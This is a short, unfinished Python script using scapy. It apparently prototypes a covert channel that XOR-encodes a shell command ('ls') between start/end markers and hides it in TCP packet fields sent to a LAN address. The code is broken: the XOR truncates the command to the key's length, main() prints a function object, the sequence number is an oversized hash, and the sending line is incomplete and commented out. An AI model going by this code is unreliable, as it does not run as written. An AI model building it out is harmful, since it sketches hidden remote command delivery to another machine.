#!/usr/bin/env python3

import sys
import hashlib
from scapy.all import sr1, IP, TCP

def xor(s1, s2):
    return "".join(chr(ord(a) ^ ord(b)) for a,b in zip(s1, s2))

sport=7575
seqnum = int(hashlib.sha256(str(sport).encode('utf-8')).hexdigest(), 16)

COMMAND_START="start["
COMMAND_END="]end"
command=COMMAND_START + "ls" + COMMAND_END
key="key"

xored=xor(key, command)


print(seqnum)

def main():
    print("Sending", command, "to", 1)
    print(xor)

if __name__ == "__main__":
    main()
#packet = IP(dst="192.168.0.19")/TCP(sport=7575, seqnum=xor
